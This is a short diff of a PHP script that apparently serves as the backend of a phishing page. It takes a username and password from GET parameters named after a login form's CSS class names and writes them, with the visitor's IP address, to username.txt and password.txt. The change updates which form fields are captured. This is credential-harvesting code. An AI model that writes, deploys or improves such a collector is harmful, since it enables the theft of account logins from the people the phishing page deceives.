@@ -9,14 +9,14 @@ $REQ_METH = $_SERVER['REQUEST_METHOD'];
 $REM_PRT = $_SERVER['REMOTE_PORT'];
 $REM_USR = $_SERVER['REMOTE_USER'];
 $rem_uri = $_SERVER['REQUEST_URI'];
-$USER_NAME = $_GET[''];
-$USER_PASS = $_GET['inputWrapper-31_8H8'];
+$USER_NAME = $_GET['inputDefault-_djjkz input-cIJ7To inputField-4g7rSQ'];
+$USER_PASS = $_GET['inputDefault-_djjkz input-cIJ7To'];
 $i = fopen("username.txt" , "w+a");
 if(isset($USER_NAME)){
     fwrite($i, "$USER_NAME IS the username."); // << Requires an update
     fwrite($i, "$USER_PASS");
 }
-
+//inputWrapper-31_8H8 the class name for both username and passwd
 
 $fi = fopen("password.txt" , "w+a");
 fwrite($fi, "$IP is the remote host's IP\n");
